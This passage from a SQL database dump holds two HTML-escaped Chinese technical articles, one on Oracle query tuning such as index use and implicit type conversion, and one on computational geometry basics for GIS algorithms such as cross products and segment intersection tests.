/&gt;\r\n例如:&amp;nbsp;&lt;br /&gt;\r\n表DEPT包含以下列:&amp;nbsp;&lt;br /&gt;\r\nDEPT_CODE PK NOT NULL&amp;nbsp;&lt;br /&gt;\r\nDEPT_DESC NOT NULL&amp;nbsp;&lt;br /&gt;\r\nDEPT_TYPE NULL&amp;nbsp;&lt;br /&gt;\r\n低效: (索引不被使用)&amp;nbsp;&lt;br /&gt;\r\nSELECT DEPT_CODE FROM&amp;nbsp; DEPT&amp;nbsp; ORDER BY&amp;nbsp; DEPT_TYPE&amp;nbsp;&lt;br /&gt;\r\n高效: (使用索引)&amp;nbsp;&lt;br /&gt;\r\nSELECT DEPT_CODE&amp;nbsp; FROM&amp;nbsp; DEPT&amp;nbsp; WHERE&amp;nbsp; DEPT_TYPE &amp;gt; 0&amp;nbsp;&lt;br /&gt;\r\n（30） 避免改变索引列的类型.:&amp;nbsp;&lt;br /&gt;\r\n当比较不同数据类型的数据时, ORACLE自动对列进行简单的类型转换.&amp;nbsp;&lt;br /&gt;\r\n假设 EMPNO是一个数值类型的索引列.&amp;nbsp;&lt;br /&gt;\r\nSELECT …&amp;nbsp; FROM EMP&amp;nbsp; WHERE&amp;nbsp; EMPNO = ‘123''&amp;nbsp;&lt;br /&gt;\r\n实际上,经过ORACLE类型转换, 语句转化为:&amp;nbsp;&lt;br /&gt;\r\nSELECT …&amp;nbsp; FROM EMP&amp;nbsp; WHERE&amp;nbsp; EMPNO = TO_NUMBER(‘123'')&amp;nbsp;&lt;br /&gt;\r\n幸运的是,类型转换没有发生在索引列上,索引的用途没有被改变.&amp;nbsp;&lt;br /&gt;\r\n现在,假设EMP_TYPE是一个字符类型的索引列.&amp;nbsp;&lt;br /&gt;\r\nSELECT …&amp;nbsp; FROM EMP&amp;nbsp; WHERE EMP_TYPE = 123&amp;nbsp;&lt;br /&gt;\r\n这个语句被ORACLE转换为:&amp;nbsp;&lt;br /&gt;\r\nSELECT …&amp;nbsp; FROM EMP&amp;nbsp; WHERETO_NUMBER(EMP_TYPE)=123&amp;nbsp;&lt;br /&gt;\r\n因为内部发生的类型转换, 这个索引将不会被用到! 为了避免ORACLE对你的SQL进行隐式的类型转换, 最好把类型转换用显式表现出来. 注意当字符和数值比较时, ORACLE会优先转换数值类型到字符类型&amp;nbsp;&lt;br /&gt;\r\n（31） 需要当心的WHERE子句:&amp;nbsp;&lt;br /&gt;\r\n某些SELECT 语句中的WHERE子句不使用索引. 这里有一些例子.&amp;nbsp;&lt;br /&gt;\r\n在下面的例子里, (1)‘!='' 将不使用索引. 记住, 索引只能告诉你什么存在于表中, 而不能告诉你什么不存在于表中. (2) ‘||''是字符连接函数. 就象其他函数那样, 停用了索引. (3) ‘+''是数学函数. 就象其他数学函数那样, 停用了索引. (4)相同的索引列不能互相比较,这将会启用全表扫描.&amp;nbsp;&lt;br /&gt;\r\n（32） a. 如果检索数据量超过30%的表中记录数.使用索引将没有显著的效率提高.&amp;nbsp;&lt;br /&gt;\r\nb. 在特定情况下, 使用索引也许会比全表扫描慢, 但这是同一个数量级上的区别. 而通常情况下,使用索引比全表扫描要块几倍乃至几千倍!&amp;nbsp;&lt;br /&gt;\r\n（33） 避免使用耗费资源的操作:&amp;nbsp;&lt;br /&gt;\r\n带有DISTINCT,UNION,MINUS,INTERSECT,ORDER BY的SQL语句会启动SQL引擎&amp;nbsp;&lt;br /&gt;\r\n执行耗费资源的排序(SORT)功能. DISTINCT需要一次排序操作, 而其他的至少需要执行两次排序. 通常, 带有UNION, MINUS , INTERSECT的SQL语句都可以用其他方式重写. 如果你的数据库的SORT_AREA_SIZE调配得好, 使用UNION , MINUS, INTERSECT也是可以考虑的, 毕竟它们的可读性很强&amp;nbsp;&lt;br /&gt;\r\n（34） 优化GROUP BY:&amp;nbsp;&lt;br /&gt;\r\n提高GROUP BY 语句的效率, 可以通过将不需要的记录在GROUP BY 之前过滤掉.下面两个查询返回相同结果但第二个明显就快了许多.&amp;nbsp;&lt;br /&gt;\r\n低效:&amp;nbsp;&lt;br /&gt;\r\nSELECT JOB , AVG(SAL)&amp;nbsp;&lt;br /&gt;\r\nFROM EMP&amp;nbsp;&lt;br /&gt;\r\nGROUP by JOB&amp;nbsp;&lt;br /&gt;\r\nHAVING JOB = ‘PRESIDENT''&amp;nbsp;&lt;br /&gt;\r\nOR JOB = ‘MANAGER''&amp;nbsp;&lt;br /&gt;\r\n高效:&amp;nbsp;&lt;br /&gt;\r\nSELECT JOB , AVG(SAL)&amp;nbsp;&lt;br /&gt;\r\nFROM EMP&amp;nbsp;&lt;br /&gt;\r\nWHERE JOB = ‘PRESIDENT''&amp;nbsp;&lt;br /&gt;\r\nOR JOB = ‘MANAGER''&amp;nbsp;&lt;br /&gt;\r\nGROUP by JOB&lt;/p&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1303623077, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(82, 1, 'GIS算法的计算几何基础', '', '', '&lt;!--[if !mso]&gt;&lt;style&gt;v\\:* {behavior:url(#default#VML);}o\\:* {behavior:url(#default#VML);}w\\:* {behavior:url(#default#VML);}.shape {behavior:url(#default#VML);}&lt;/style&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 9]&gt;&lt;xml&gt; &lt;w :WordDocument&gt;  &lt;w :View&gt;Normal&lt;/w :View&gt;  &lt;w :Zoom&gt;0&lt;/w :Zoom&gt;  &lt;w :PunctuationKerning/&gt;  &lt;w :DrawingGridVerticalSpacing&gt;7.8 磅&lt;/w :DrawingGridVerticalSpacing&gt;  &lt;w :DisplayHorizontalDrawingGridEvery&gt;0&lt;/w :DisplayHorizontalDrawingGridEvery&gt;  &lt;w :DisplayVerticalDrawingGridEvery&gt;2&lt;/w :DisplayVerticalDrawingGridEvery&gt;  &lt;w :ValidateAgainstSchemas/&gt;  &lt;w :SaveIfXMLInvalid&gt;false&lt;/w :SaveIfXMLInvalid&gt;  &lt;w :IgnoreMixedContent&gt;false&lt;/w :IgnoreMixedContent&gt;  &lt;w :AlwaysShowPlaceholderText&gt;false&lt;/w :AlwaysShowPlaceholderText&gt;  &lt;w :Compatibility&gt;   &lt;w :SpaceForUL/&gt;   &lt;w :BalanceSingleByteDoubleByteWidth/&gt;   &lt;w :DoNotLeaveBackslashAlone/&gt;   &lt;w :ULTrailSpace/&gt;   &lt;w :DoNotExpandShiftReturn/&gt;   &lt;w :AdjustLineHeightInTable/&gt;   &lt;w :BreakWrappedTables/&gt;   &lt;w :SnapToGridInCell/&gt;   &lt;w :WrapTextWithPunct/&gt;   &lt;w :UseAsianBreakRules/&gt;   &lt;w :DontGrowAutofit/&gt;   &lt;w :UseFELayout/&gt;  &lt;/w :Compatibility&gt;  &lt;w :BrowserLevel&gt;MicrosoftInternetExplorer4&lt;/w :BrowserLevel&gt; &lt;/w :WordDocument&gt;&lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 9]&gt;&lt;xml&gt; &lt;w :LatentStyles deflockedstate=&quot;false&quot; latentstylecount=&quot;156&quot;&gt; &lt;/w :LatentStyles&gt;&lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 10]&gt;&lt;style&gt; /* Style Definitions */ table.MsoNormalTable	{mso-style-name:普通表格;	mso-tstyle-rowband-size:0;	mso-tstyle-colband-size:0;	mso-style-noshow:yes;	mso-style-parent:&quot;&quot;;	mso-padding-alt:0cm 5.4pt 0cm 5.4pt;	mso-para-margin:0cm;	mso-para-margin-bottom:.0001pt;	mso-pagination:widow-orphan;	font-size:10.0pt;	font-family:&quot;Times New Roman&quot;;	mso-fareast-font-family:&quot;Times New Roman&quot;;	mso-ansi-language:#0400;	mso-fareast-language:#0400;	mso-bidi-language:#0400;}&lt;/style&gt;&lt;![endif]--&gt;&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;color:#074483;&quot;&gt;矢量的概念&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;如果一条线段的端点是有次序之分的，我们把这种线段成为有向线段&lt;span lang=&quot;EN-US&quot;&gt;(directedsegment)&lt;/span&gt;。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;如果有向线段&lt;span lang=&quot;EN-US&quot;&gt;p1p2&lt;/span&gt;的起点&lt;span lang=&quot;EN-US&quot;&gt;p1&lt;/span&gt;在坐标原点，我们可以把它称为矢量&lt;span lang=&quot;EN-US&quot;&gt;(vector)p2&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;color:#074483;&quot;&gt;矢量加减法&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;设二维矢量&lt;span lang=&quot;EN-US&quot;&gt;P = ( x1, y1 )&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;Q = ( x2 , y2 )&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;则矢量加法定义为：&lt;span lang=&quot;EN-US&quot;&gt; P + Q =( x1 + x2 , y1 + y2 )&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;矢量减法定义为：&lt;span lang=&quot;EN-US&quot;&gt; P - Q = (x1 - x2 , y1 - y2 )&lt;/span&gt;。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;显然有性质&lt;span lang=&quot;EN-US&quot;&gt; P + Q = Q + P&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;P - Q = - ( Q - P )&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;color:#074483;&quot;&gt;矢量叉积&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;计算矢量叉积是与直线和线段相关算法的核心部分。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;设矢量&lt;span lang=&quot;EN-US&quot;&gt;P = ( x1, y1 )&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;Q = ( x2, y2)&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;则矢量叉积定义为由&lt;span lang=&quot;EN-US&quot;&gt;(0,0)&lt;/span&gt;、&lt;span lang=&quot;EN-US&quot;&gt;p1&lt;/span&gt;、&lt;span lang=&quot;EN-US&quot;&gt;p2&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;p1+p2&lt;/span&gt;所组成的平行四边形的带符号的面积，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;即：&lt;span lang=&quot;EN-US&quot;&gt;P × Q = x1*y2 - x2*y1&lt;/span&gt;，其结果是一个标量。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;显然有性质&lt;span lang=&quot;EN-US&quot;&gt; P × Q = - ( Q × P ) &lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt; P ×( - Q ) = - ( P × Q )&lt;/span&gt;。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;两点的加减法就是矢量相加减，而点的乘法则看作矢量叉积。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;叉积的一个非常重要性质是可以通过它的符号判断两矢量相互之间的顺逆时针关系：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　若&lt;span lang=&quot;EN-US&quot;&gt; P × Q &amp;gt; 0 , &lt;/span&gt;则&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;在&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;的顺时针方向。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　若&lt;span lang=&quot;EN-US&quot;&gt; P × Q &amp;lt; 0 , &lt;/span&gt;则&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;在&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;的逆时针方向。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　若&lt;span lang=&quot;EN-US&quot;&gt; P × Q = 0 , &lt;/span&gt;则&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;与&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;共线，但可能同向也可能反向。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;color:#074483;&quot;&gt;折线段的拐向判断&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　折线段的拐向判断方法可以直接由矢量叉积的性质推出。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;对于有公共端点的线段&lt;span lang=&quot;EN-US&quot;&gt;p0p1&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;p1p2&lt;/span&gt;，通过计算&lt;span lang=&quot;EN-US&quot;&gt;(p2 - p0) × (p1 - p0)&lt;/span&gt;的符号便可以确定折线段的拐向：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　若&lt;span lang=&quot;EN-US&quot;&gt;(p2 - p0) × (p1 - p0) &amp;gt; 0,&lt;/span&gt;则&lt;span lang=&quot;EN-US&quot;&gt;p0p1&lt;/span&gt;在&lt;span lang=&quot;EN-US&quot;&gt;p1&lt;/span&gt;点拐向右侧后得到&lt;span lang=&quot;EN-US&quot;&gt;p1p2&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　若&lt;span lang=&quot;EN-US&quot;&gt;(p2 - p0) × (p1 - p0) &amp;lt; 0,&lt;/span&gt;则&lt;span lang=&quot;EN-US&quot;&gt;p0p1&lt;/span&gt;在&lt;span lang=&quot;EN-US&quot;&gt;p1&lt;/span&gt;点拐向左侧后得到&lt;span lang=&quot;EN-US&quot;&gt;p1p2&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　若&lt;span lang=&quot;EN-US&quot;&gt;(p2 - p0) × (p1 - p0) = 0,&lt;/span&gt;则&lt;span lang=&quot;EN-US&quot;&gt;p0&lt;/span&gt;、&lt;span lang=&quot;EN-US&quot;&gt;p1&lt;/span&gt;、&lt;span lang=&quot;EN-US&quot;&gt;p2&lt;/span&gt;三点共线。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　具体情况可参照下图：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;img src=&quot;file:///C:/DOCUME%7E1/ADMINI%7E1/LOCALS%7E1/Temp/msohtml1/01/clip_image001.gif&quot; height=&quot;32&quot; width=&quot;32&quot; /&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　　&lt;span style=&quot;color:#074483;&quot;&gt;判断点是否在线段上&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　设点为&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;，线段为&lt;span lang=&quot;EN-US&quot;&gt;P1P2 &lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;判断点&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;在该线段上的依据是：&lt;span lang=&quot;EN-US&quot;&gt;( Q - P1 ) × ( P2- P1 ) = 0 &lt;/span&gt;且&lt;span lang=&quot;EN-US&quot;&gt; Q &lt;/span&gt;在以&lt;span lang=&quot;EN-US&quot;&gt; P1&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;P2&lt;/span&gt;为对角顶点的矩形内。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;前者保证&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;点在直线&lt;span lang=&quot;EN-US&quot;&gt;P1P2&lt;/span&gt;上，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;后者是保证&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;点不在线段&lt;span lang=&quot;EN-US&quot;&gt;P1P2&lt;/span&gt;的延长线或反向延长线上，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;对于这一步骤的判断可以用以下过程实现：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;if min(Xp1,Xp2) &amp;lt;= Xq &amp;lt;=max(Xp1,Xp2) and min(Yp1,Yp2) &amp;lt;= Yq &amp;lt;= max(Yp1,Yp2)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{ return true};&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;else &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{return false;}&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　特别要注意的是，由于需要考虑水平线段和垂直线段两种特殊情况，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\nmin(xi,xj)&amp;lt;=xk&amp;lt;=max(xi,xj)&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;min(yi,yj)&amp;lt;=yk&amp;lt;=max(yi,yj)&lt;/span&gt;两个条件必须同时满足才能返回真值。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;判断两线段是否相交&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　我们分两步确定两条线段是否相交：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;(1)&lt;/span&gt;快速排斥试验&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　设以线段&lt;span lang=&quot;EN-US&quot;&gt; P1P2 &lt;/span&gt;为对角线的矩形为&lt;span lang=&quot;EN-US&quot;&gt;R&lt;/span&gt;， 设以线段&lt;span lang=&quot;EN-US&quot;&gt; Q1Q2 &lt;/span&gt;为对角线的矩形为&lt;span lang=&quot;EN-US&quot;&gt;T&lt;/span&gt;，如果&lt;span lang=&quot;EN-US&quot;&gt;R&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;T&lt;/span&gt;不相交，显然两线段不会相交。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;(2)&lt;/span&gt;跨立试验&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　如果两线段相交，则两线段必然相互跨立对方。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;若&lt;span lang=&quot;EN-US&quot;&gt;P1P2&lt;/span&gt;跨立&lt;span lang=&quot;EN-US&quot;&gt;Q1Q2 &lt;/span&gt;，则矢量&lt;span lang=&quot;EN-US&quot;&gt; ( P1 - Q1 ) &lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;( P2 - Q1 )&lt;/span&gt;位于矢量&lt;span lang=&quot;EN-US&quot;&gt;( Q2 - Q1 ) &lt;/span&gt;的两侧，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;即&lt;span lang=&quot;EN-US&quot;&gt;( P1 - Q1 ) × ( Q2 - Q1 ) * ( P2 - Q1 ) × ( Q2 - Q1 )&amp;lt; 0&lt;/span&gt;。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;上式可改写成&lt;span lang=&quot;EN-US&quot;&gt;( P1 - Q1 ) × ( Q2 - Q1 ) * ( Q2 - Q1 ) × ( P2 -Q1 ) &amp;gt; 0&lt;/span&gt;。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;当&lt;span lang=&quot;EN-US&quot;&gt; ( P1 - Q1 ) × ( Q2 - Q1 ) = 0 &lt;/span&gt;时，说明&lt;span lang=&quot;EN-US&quot;&gt; ( P1 - Q1 ) &lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt; ( Q2 - Q1 )&lt;/span&gt;共线，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;但是因为已经通过快速排斥试验，所以&lt;span lang=&quot;EN-US&quot;&gt; P1 &lt;/span&gt;一定在线段&lt;span lang=&quot;EN-US&quot;&gt; Q1Q2&lt;/span&gt;上；&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;同理，&lt;span lang=&quot;EN-US&quot;&gt;( Q2 - Q1 ) ×(P2 - Q1 ) = 0 &lt;/span&gt;说明&lt;span lang=&quot;EN-US&quot;&gt; P2 &lt;/span&gt;一定在线段&lt;span lang=&quot;EN-US&quot;&gt; Q1Q2&lt;/span&gt;上。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;所以判断&lt;span lang=&quot;EN-US&quot;&gt;P1P2&lt;/span&gt;跨立&lt;span lang=&quot;EN-US&quot;&gt;Q1Q2&lt;/span&gt;的依据是：&lt;span lang=&quot;EN-US&quot;&gt;( P1 - Q1 ) × ( Q2 - Q1 ) * ( Q2 - Q1 ) × ( P2 - Q1 ) &amp;gt;= 0&lt;/span&gt;。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;同理判断&lt;span lang=&quot;EN-US&quot;&gt;Q1Q2&lt;/span&gt;跨立&lt;span lang=&quot;EN-US&quot;&gt;P1P2&lt;/span&gt;的依据是：&lt;span lang=&quot;EN-US&quot;&gt;( Q1 - P1 ) × ( P2 - P1 ) * ( P2 - P1 ) × ( Q2 - P1 ) &amp;gt;= 0&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;color:#074483;&quot;&gt;判断线段和直线是否相交&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;/b&gt;如果线段&lt;span lang=&quot;EN-US&quot;&gt;P1P2&lt;/span&gt;和直线&lt;span lang=&quot;EN-US&quot;&gt;Q1Q2&lt;/span&gt;相交，则&lt;span lang=&quot;EN-US&quot;&gt;P1P2&lt;/span&gt;跨立&lt;span lang=&quot;EN-US&quot;&gt;Q1Q2&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;即：&lt;span lang=&quot;EN-US&quot;&gt;( P1 - Q1 ) × ( Q2 - Q1 ) * ( Q2 - Q1 ) × ( P2 - Q1 )&amp;gt;= 0&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;判断矩形是否包含点&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;/b&gt;只要判断该点的横坐标和纵坐标是否夹在矩形的左右边和上下边之间。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;判断线段、折线、多边形是否在矩形中&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;：&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;因为矩形是个凸集，所以只要判断所有端点是否都在矩形中就可以了。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;判断矩形是否在矩形中&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　只要比较左右边界和上下边界就可以了。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;判断圆是否在矩形中&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　很容易证明，圆在矩形中的充要条件是：圆心在矩形中且圆的半径小于等于圆心到矩形四边的距离的最小值。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　　&lt;span style=&quot;color:#074483;&quot;&gt;判断点是否在多边形中&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　判断点&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;是否在多边形中是计算几何中一个非常基本但是十分重要的算法。以点&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;为端点，向 左方作射线&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;，由于多边形是有界的，所以射线&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;的左端一定在多边形外，考虑沿着&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;从无穷远处开始自左向右移动，遇到和多边形的第一个交点的时候，进入到了多边形的内部，遇到第二个交点的时候，离开了多边形，&lt;span lang=&quot;EN-US&quot;&gt;……&lt;/span&gt;所以很容易看出当&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;和多边形的交点数目&lt;span lang=&quot;EN-US&quot;&gt;C&lt;/span&gt;是奇数的时候，&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;在多边形内，是偶数的话&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;在多边形外。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　但是有些特殊情况要加以考虑。如图下图&lt;span lang=&quot;EN-US&quot;&gt;(a)(b)(c)(d)&lt;/span&gt;所示。在图&lt;span lang=&quot;EN-US&quot;&gt;(a)&lt;/span&gt;中，&lt;span lang=&quot;EN-US&quot;&gt;L &lt;/span&gt;和多边形的顶点相交，这时候交点只能计算一个；在图&lt;span 